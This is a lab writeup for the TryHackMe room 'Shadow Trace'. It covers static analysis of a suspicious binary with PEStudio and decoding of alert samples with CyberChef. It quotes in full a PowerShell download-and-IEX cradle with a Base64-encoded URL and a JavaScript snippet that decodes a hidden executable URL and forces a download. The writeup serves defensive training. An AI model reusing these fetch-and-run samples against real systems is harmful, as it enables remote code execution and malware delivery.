---
title: "TryHackMe: Shadow Trace Writeup - Easy"
date: 2025-10-11 23:32:00 +0300
tags: [tryhackme, analysis, javascript, powershell, binary]
categories: [TryHackMe]
image:
  path: /assets/images/2025-10-11-thm-shadowtrace/cover.png
---

## Overview
**Shadow Trace** is a relatively simple room that starts with analyzing a binary and then moves on to inspecting alerts containing **PowerShell** and **JavaScript** code. Some basic knowledge of these languages is helpful, along with familiar analysis tools.

## Analyzing the Binary
After booting the provided virtual machine, we see a binary called **windows-update.exe** on the desktop. This is the binary we need to analyze. The VM also includes analysis tools in the **DFIR Tools** folder, which is accessible via the desktop shortcut.

### PEStudio
We find **PEStudio** under `DFIR Tools\pestudio`. Launching the app and dragging the binary onto the window we can start the analysis. The first section we see has the answers to questions 1 and 2.

![PEStudio]({{ site.baseurl }}/assets/images/2025-10-11-thm-shadowtrace/ss1.png) 

Next, we move on to question 3:  
> Identify the URL within the file to use as an IOC.

We need to locate a URL inside the binary. Unless it’s obfuscated, it should appear in the **strings** section. After scrolling through the strings, we find a lot that looks interesting. While here, we can also gather answers for other questions since they are also in the strings section.

![Strings]({{ site.baseurl }}/assets/images/2025-10-11-thm-shadowtrace/ss2.png)

Questions 3 and 4 are in plain sight. However, one string looks like it might be encoded. Let’s verify it with **CyberChef**.

![CyberChef URL Flag Decoded]({{ site.baseurl }}/assets/images/2025-10-11-thm-shadowtrace/ss5.png)

CyberChef confirms the string is base64 encoded. Decoding it reveals our flag.

The last question in this section asks:  
> What library related to socket communication is loaded by the binary?

PEStudio’s **libraries** section has this answer. One of the libraries stick out.

![Libraries]({{ site.baseurl }}/assets/images/2025-10-11-thm-shadowtrace/ss3.png)

## Analyzing Alerts
Opening the static site, we see two alerts: one triggered by PowerShell and the other by Chrome. First, we examine the PowerShell alert to extract its URL.

```powershell
(new-object system.net.webclient).DownloadString([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly90cnloYXRtZS5jb20vZGV2L21haW4uZXhl"))) | IEX;
```

This command creates a `System.Net.WebClient` object, downloads the response from a Base64-encoded URL, and pipes it to `IEX` (Invoke-Expression) to execute the script. Using **CyberChef** to decode the Base64 argument reveals the URL.

![CyberChef PowerShell Flag Decoded]({{ site.baseurl }}/assets/images/2025-10-11-thm-shadowtrace/ss6.png)

The remaining questions involve the Chrome alert, which executes JavaScript. Lets prettify the code first to make it easier to read:

```javascript
fetch(
  [
    104, 116, 116, 112, 115, 58, 47, 47, 114, 101, 97, 108, 108, 121, 115, 101,
    99, 117, 114, 101, 117, 112, 100, 97, 116, 101, 46, 116, 114, 121, 104, 97,
    116, 109, 101, 46, 99, 111, 109, 47, 117, 112, 100, 97, 116, 101, 46, 101,
    120, 101,
  ]
    .map((c) => String.fromCharCode(c))
    .join(""),
)
  .then((r) => r.blob())
  .then((b) => {
    const u = URL.createObjectURL(b);
    const a = document.createElement("a");
    a.href = u;
    a.download = "test.txt";
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(u);
  });
```

The first question is how the URL is decoded. The array of numbers are actually just ASCII characters decimal values, which we can see by the use of `String.fromCharCode()`. With this information we can decode this with **CyberChef** using the "From Decimal" recipe.

![CyberChef JavaScript Flag Decoded]({{ site.baseurl }}/assets/images/2025-10-11-thm-shadowtrace/ss4.png)

Once the URL is obtained, the last step is determining the file name used for download. The script converts the fetched resource into a binary blob, creates a temporary browser-only URL for it, then generates a new `<a>` element with this URL as its `href`. The `download` attribute sets the file name (`test.txt`). The element is appended then clicked to initiate the download.

## Conclusion

This room demonstrates a basic workflow for binary and alert analysis, combining static inspection of binaries with simple PowerShell and JavaScript decoding techniques.
